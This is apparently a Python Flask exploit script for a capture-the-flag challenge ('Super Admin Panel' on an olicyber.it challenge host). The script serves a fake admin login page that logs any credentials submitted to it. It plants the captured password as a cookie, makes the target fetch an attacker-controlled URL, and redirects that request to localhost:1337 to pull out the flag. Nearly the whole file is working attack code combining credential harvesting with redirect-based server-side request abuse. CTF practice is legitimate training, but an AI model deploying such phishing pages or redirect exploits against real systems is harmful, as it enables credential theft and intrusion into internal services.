#!/usr/bin/env python3

from flask import Flask, redirect, request
import requests, re

app = Flask(__name__)
s = requests.Session()

PAYLOAD = """
<html>
    <head>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&amp;family=Inter:wght@300&amp;display=swap" rel="stylesheet">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&amp;family=Inter:wght@300&amp;display=swap" rel="stylesheet">
        <title>Super Admin Panel</title>
    </head>
    <body
        style="font-family: 'Inter'; max-width: 700px; margin: 0 auto; background-color: #08090f; padding: 20px; color: #0095ff;">
        <button id="pwn" onclick="document.getElementById('pwn').remove()"></button>
        <h1 style="font-size: 3rem; font-family: 'JetBrains Mono', monospace;">Super Admin Panel</h1>

        <form action="/" method="POST" style="background-color: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 255, 0.7);">
            <input id="username" name="username" type="text" placeholder="Username" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
            <input id="password" name="password" type="password" placeholder="Password" style="width: 100%; padding: 10px; border: 2px solid #007BFF; border-radius: 5px; background: transparent; margin-bottom: 10px; display:block; color: #fff; font-size: 20px;">
            <button style="width: 100%; padding: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; display:block; color: #fff; font-size: 20px; margin-bottom: 10px;" id="pwn" type="submit" value="Submit">Login</button>
            <button style="width: 100%; padding: 10px; background-color: transparent; border: 2px solid #007BFF; color: white; border-radius: 5px; cursor: pointer; display:block; color: #fff; font-size: 20px;" type="button">&nbsp;</button>
        </form>
        <a href="#" onclick="alert('oh?')" style="font-size: 2rem; font-family: 'JetBrains Mono', monospace;">Report</a>
    </body>
</html>
"""

url = input("Enter the url of this site (es: the ngrok url): ")
REGEX = r"flag{.*}"

@app.route('/', methods=["POST","GET"])
def index():
    if request.method == "GET":
        return PAYLOAD
    username = request.form["username"]
    password = request.form["password"]
    app.logger.info(f"\nusername: {username}\npassword: {password}")
    s.cookies.set("passw", password, domain="superadminpanel.challs.olicyber.it")
    data = s.post("http://superadminpanel.challs.olicyber.it/panel", data={"link":url+"/redirect"})
    flag = re.findall(REGEX, data.text)
    app.logger.info("FLAG: "+str(flag))
    return "ok"

@app.route('/redirect')
def exploit():
    return redirect("http://localhost:1337/")

if __name__ == "__main__":
    app.run("0.0.0.0", 8080, debug=True)